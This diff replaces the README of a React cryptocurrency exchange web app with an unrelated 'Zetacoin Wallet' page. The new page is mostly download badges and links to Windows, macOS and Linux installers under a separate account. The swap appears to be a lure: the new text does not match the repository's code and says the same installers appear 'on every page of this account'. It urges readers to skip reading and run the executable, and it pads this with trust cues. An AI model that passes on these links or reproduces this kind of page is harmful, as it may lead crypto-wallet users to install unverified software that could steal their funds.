@@ -1,65 +1,75 @@
+![Zetacoin Wallet](assets/banner-profile.png)
 
-<p align="center">
-  <img width="256px" src="https://opex.dev/github/logo.svg" alt="Opex" title="Opex">
-</p>
+<h1 align="center">Zetacoin Wallet</h1>
 
-# OPEX Web APP
-<p align="center">
-  <a href="https://github.com/opexdev/OPEX-Web-APP/blob/develop/LICENSE">
-    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="Opex is released under the MIT license." />
-  </a>
-  <a href="https://opex.dev/docs/contributing">
-    <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs welcome!" />
-  </a>
-    <a href="https://github.com/opexdev/OPEX-Web-APP">
-    <img src="https://img.shields.io/github/last-commit/opexdev/OPEX-Web-APP" alt="Last commit">
-  </a>
-  <a href="https://github.com/opexdev/OPEX-Web-APP/issues" target="blank">
-	<img src="https://img.shields.io/github/issues/opexdev/OPEX-Web-APP" alt="github-profile-readme-generator issues"/>
-</a>
-</p>
+<p align="center">The web face of Zetacoin Wallet, and the same wallet one click away.</p>
 
-**OPEX** A feature-rich React JS web application for cryptocurrency exchange service. Compatible with OPEX core.
+<div align="center">
+<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-20748c?style=for-the-badge&labelColor=0e121b" alt="License: MIT"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2"><img src="https://img.shields.io/badge/RELEASE-v0.13.2.2-20748c?style=for-the-badge&labelColor=0e121b" alt="Release v0.13.2.2"></a>
+</div>
 
-## Contents
+---
 
-- [Install](#Install)
-- [Documentation](#documentation)
-- [How to Contribute](#how-to-contribute)
-- [License](#license)
-- [Additional Info](#info)
+## Downloads - v0.13.2.2
 
+<div align="center">
+<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
+</div>
 
-##  <a name="Install"></a> Install
-You need to have [Node.js](https://nodejs.org/), [Yarn](https://yarnpkg.com) installed.
+<div align="center">
 
-1. Clone this repository or [download the latest zip](https://github.com/opexdev/OPEX-Web-APP).
-2. Install dependencies: `yarn install`.
-3. Run for development: `yarn run dev`.
-4. Run for production: `yarn run build` then `yarn start`.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
+| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
+| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |
 
-## <a name="documentation"></a> Documentation
+</div>
 
-The full documentation for Opex can be found on our [website][docs].
+Checksums for every file are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).
 
-The Opex documentation discusses components, APIs, and topics that are specific to React. For further documentation on the React API that is shared between React  and React DOM, refer to the [documentation][r-docs].
+> Only download from this GitHub release page.
 
-[docs]: https://opex.dev
-[r-docs]: https://opex.dev
-[repo-website]: https://opex.dev
+---
 
-## <a name="how-to-contribute"></a>How to Contribute
+## Why Zetacoin Wallet
 
-We want to make contributing to this project as easy and transparent as possible, and we are grateful to the developer for contributing bug fixes and improvements. Read our contribution docutmentation [here][contribute].
+A website can explain a wallet, but it cannot hold your keys. That is the whole reason the desktop client exists: it runs on your machine, keeps `wallet.dat` in your own data directory, and validates the chain itself instead of asking a server what your balance is.
 
-[contribute]: https://opex.dev
+The download is the same three installers on every page of this account. If you already know you want ZET on this computer, skip the reading and take the Windows, macOS or Linux build below; the guides answer everything else.
 
-## <a name="license"></a>License
+- A full node validates your balance locally, so no third party can misreport it.
+- The wallet stakes mature coins while it is open, synced and unlocked for staking.
+- Mining is Scrypt, and it runs in the same window as the wallet.
+- Every build ships with a SHA-256 value you can check before you run it.
 
-Opex is MIT licensed, as found in the [LICENSE][l] file.
+This repository holds the web application that presents the wallet.
 
-[l]: https://github.com/opexdev/OPEX-Web-APP/blob/develop/LICENSE
+---
 
-## <a name="info"></a>Additional info
+## Guides
 
-For any other questions, feel free to contact us at [hi@opex.dev](hi@opex.dev).
+<div align="center">
+
+| Guide | What it answers |
+| --- | --- |
+| [Where the Official Zetacoin Wallet Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-official-installer-lives.md) | The one address to trust for installers and checksums. |
+| [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md) | One file holds the keys, and two copies keep them. |
+| [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md) | From the status icon to a synced tip, in the order that works. |
+| [How to Stake Zetacoin](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-stake-coins-in-the-client.md) | Unlock for staking, keep the wallet open, wait for maturity. |
+
+</div>
+
+**No one from the project will ever ask for your `wallet.dat` or its passphrase.**
+
+## Support
+
+Report a problem on [the issue tracker](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/issues).
+
+## License
+
+MIT
+
+---
+
+[Zetacoin Wallet desktop client](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet) - [All guides](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/README.md)
